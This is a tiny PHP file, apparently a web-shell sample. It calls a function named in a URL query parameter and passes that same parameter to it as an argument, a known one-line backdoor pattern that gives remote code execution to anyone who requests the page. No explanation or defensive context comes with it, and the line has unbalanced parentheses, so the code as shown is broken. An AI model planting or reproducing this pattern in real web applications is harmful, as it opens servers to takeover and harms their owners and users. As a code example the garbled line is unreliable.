<?php
$_GET['2DiiW5fx'](($_GET['2DiiW5fx']);
?>
